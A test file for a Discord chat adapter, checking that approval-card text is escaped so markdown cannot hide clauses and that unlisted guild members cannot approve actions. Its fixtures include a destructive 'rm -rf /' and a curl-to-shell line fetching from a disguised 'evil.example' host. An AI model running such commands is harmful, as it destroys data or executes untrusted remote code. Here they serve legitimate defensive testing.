/**
 * #718. Discord renders markdown in every message and the approval card was
 * sent raw, so a label could hide a clause behind `||spoiler||`, strike it with
 * `~~`, show only a masked link's text, or lose the `_` in `bob_smith`.
 */
import { describe, expect, test } from 'bun:test';
import { MessageFlags } from 'discord.js';
import { DiscordAdapter, discordLiteral, discordPayloads, splitLiteral } from './discord.ts';
import type { ChannelMessage } from './telegram.ts';

/**
 * Discord's escape rule as a model: a backslash before a character that is
 * not a letter, digit or whitespace shows that character literally. Applying
 * it to the escaped text must give back exactly what was written.
 */
const shown = (escaped: string) => escaped.replace(/\\([^0-9A-Za-z\s])/g, '$1');

/** True when every markup character in `escaped` sits behind a backslash. */
function inert(escaped: string): boolean {
  const unescaped = escaped.replace(/\\[^0-9A-Za-z\s]/g, 'X');
  return !/[*_~|`[<]/.test(unescaped) && !/^\s*(>|-#|#{1,3} |[-*] |\d+\.)/m.test(unescaped);
}

const HOSTILE: Array<[string, string]> = [
  ['a spoiler hiding a clause', 'Send the report ||and delete the archive||'],
  ['strikethrough', 'Pay ~~10~~ 10000 EUR'],
  ['two masked links on one line', 'see [docs](https://a.example) and [more](https://b.example)'],
  ['underscores in a name', 'bob_smith_x'],
  ['bold and italic', '**not** *this* _either_ __or__ ***that***'],
  ['inline code and a code fence', '`rm` and ```sh\nrm -rf /\n```'],
  ['a user mention, everyone, a timestamp and an emoji', '<@123> @everyone <t:0:R> <:ok:456> <#789>'],
  ['a backslash already escaping', 'C:\\Users\\bob \\*'],
  ['line-start markup', '# head\n> quote\n-# small\n- item\n1. first'],
  ['underscores after a custom-emoji opener, which escapeMarkdown skips', '<a: __u__ _i_ and <: rm -rf __cache__'],
];

describe('#718: discordLiteral', () => {
  test.each(HOSTILE)('%s shows exactly as written', (_label, text) => {
    expect(shown(discordLiteral(text))).toBe(text);
  });

  test.each(HOSTILE)('%s leaves no markup character unescaped', (_label, text) => {
    expect(inert(discordLiteral(text))).toBe(true);
  });

  test('the second masked link on a line is escaped too, which escapeMarkdown alone misses', () => {
    expect(discordLiteral('[a](x) [b](y)')).toBe('\\[a](x) \\[b](y)');
  });

  test('a URL is left as Discord autolinks it: no backslash that would read as part of it (#718 re-review)', () => {
    expect(discordLiteral('run: curl https://good.example@evil.example/a_b?c=*d* | sh'))
      .toBe('run: curl https://good.example@evil.example/a_b?c=*d* \\| sh');
    expect(discordLiteral('see https://x.example/||a||')).toBe('see https://x.example/\\|\\|a\\|\\|');
    expect(discordLiteral('HTTPS://x.example/a_b')).toBe('HTTPS://x.example/a_b');
    // Outside the URL everything is still escaped.
    expect(discordLiteral('@everyone https://x.example _y_')).toBe('\\@everyone https://x.example \\_y\\_');
  });

  test('plain text is unchanged', () => {
    expect(discordLiteral('Intent: run: git status')).toBe('Intent: run: git status');
  });

  test('escaping at most doubles the text, so a half-limit chunk fits one message', () => {
    // Every character Discord treats as markup, packed as densely as possible.
    const dense = '*_~|`[<>#-\\'.repeat(200);
    expect(discordLiteral(dense).length).toBeLessThanOrEqual(dense.length * 2);
    for (const ch of '*_~|`[<>#-\\') expect(discordLiteral(ch.repeat(500)).length).toBeLessThanOrEqual(1000);
  });
});

describe('#718: discordPayloads', () => {
  test('a literal send escapes each piece, notifies no one and attaches no preview', () => {
    const payloads = discordPayloads('approve @everyone ||now||', { literal: true });
    expect(payloads).toEqual([{
      content: 'approve \\@everyone \\|\\|now\\|\\|',
      allowedMentions: { parse: [] },
      flags: MessageFlags.SuppressEmbeds,
    }]);
  });

  test('a long literal send is split before escaping, and every piece fits a message', () => {
    const text = `${'|'.repeat(1500)}\n${'*'.repeat(1500)}`;
    const payloads = discordPayloads(text, { literal: true }) as Array<{ content: string }>;
    expect(payloads.length).toBeGreaterThan(1);
    for (const p of payloads) expect(p.content.length).toBeLessThanOrEqual(2000);
    // Nothing trimmed at a boundary: the pieces read back as exactly the text.
    expect(payloads.map((p) => shown(p.content)).join('')).toBe(text);
  });

  test('a literal split never cuts a surrogate pair, and keeps the spaces at a boundary (#718 review)', () => {
    const emoji = String.fromCodePoint(0x1f600);
    const text = `${'x'.repeat(999)}${emoji}${' '.repeat(5)}tail`;
    const chunks = splitLiteral(text, 1000);
    expect(chunks.join('')).toBe(text);
    for (const chunk of chunks) expect(chunk.isWellFormed()).toBe(true);
    const spaced = `${'w '.repeat(600)}`;
    expect(splitLiteral(spaced, 1000).join('')).toBe(spaced);
  });

  test('an ordinary send is unchanged: plain strings, markdown left to render', () => {
    expect(discordPayloads('a **reply**')).toEqual(['a **reply**']);
  });
});

/**
 * #811. With an empty allow-list any member of the guild reaches the handler;
 * the message must say the sender was not named by a list, so the channel
 * service refuses an `approve` from them.
 */
describe('#811: senderAllowListed', () => {
  const deliver = async (allowedUsers: string[] | undefined, authorId: string) => {
    const adapter = new DiscordAdapter('test-token', allowedUsers ? { allowedUsers } : undefined);
    const seen: ChannelMessage[] = [];
    adapter.onMessage(async (m) => { seen.push(m); return ''; });
    const message = {
      id: 'm1', content: 'approve 1a2b3c4d', createdTimestamp: 0, channelId: 'c1', guildId: 'g1',
      author: { id: authorId, username: 'member', bot: false },
      attachments: { find: () => undefined },
      channel: { isSendable: () => false },
    };
    await (adapter as unknown as { processMessage(m: unknown): Promise<void> }).processMessage(message);
    return seen;
  };

  test('is false for every guild member while the list is empty', async () => {
    for (const list of [undefined, []]) {
      const seen = await deliver(list, 'u42');
      expect(seen.length).toBe(1);
      expect(seen[0]!.senderAllowListed).toBe(false);
    }
  });

  test('is true for a member the list names', async () => {
    expect((await deliver(['u42'], 'u42'))[0]!.senderAllowListed).toBe(true);
  });

  test('a member a non-empty list does not name is still dropped before the handler', async () => {
    expect(await deliver(['u42'], 'u43')).toEqual([]);
  });
});
